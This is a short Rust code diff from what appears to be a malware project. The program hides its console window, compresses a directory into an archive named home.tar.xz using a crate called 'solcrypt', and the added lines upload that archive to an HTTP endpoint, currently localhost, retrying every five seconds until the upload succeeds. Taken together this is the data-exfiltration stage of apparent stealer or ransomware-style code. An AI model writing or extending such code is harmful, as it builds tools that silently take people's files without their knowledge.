@@ -1,6 +1,8 @@
 use std::{fs, path::Path};
 use solcrypt::VarSet;
-use reqwest::blocking::multipart;
+use reqwest::blocking::{multipart, Client};
+use std::thread::sleep;
+use std::time::Duration;
 
 #[windows_subsystem = "windows"]
 
@@ -26,5 +28,22 @@ fn main() {
     
     solcrypt::compress_directory_to_tar_xz(varset.dirpath.clone(), varset.dest.clone()).unwrap();
 
+    // File upload
+    let client = Client::new();
+
+    loop {
+        let form = multipart::Form::new()
+            .file("home.tar.xz", &varset.dest).unwrap();
+        let resp = client
+            .post("http://localhost:8080/upload")
+            .multipart(form)
+            .send();
+
+        if resp.is_ok() {
+            break;
+        }
+        sleep(Duration::from_secs(5));
+    }
+    
 
 }
